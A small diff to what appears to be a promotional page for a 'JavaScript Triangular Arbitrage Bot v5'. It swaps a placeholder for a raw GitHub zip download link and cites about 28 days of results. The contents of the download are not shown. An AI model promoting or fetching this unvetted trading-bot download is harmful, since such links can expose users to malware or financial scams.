@@ -11,7 +11,7 @@ https://vimeo.com/827603249
 
 <p>You can Download the zip file of the program here</p>
 
-replace with zip link
+https://github.com/TheDEXRabit/Javascript-Triangular-Arbitrage-Bot-v5/raw/main/JavaScript-TriArb-Bot-v5-Trade-Smarter.zip
 
 
 <p>The results of the program's execution have been compiled over a period of approximately 28 days.</p>
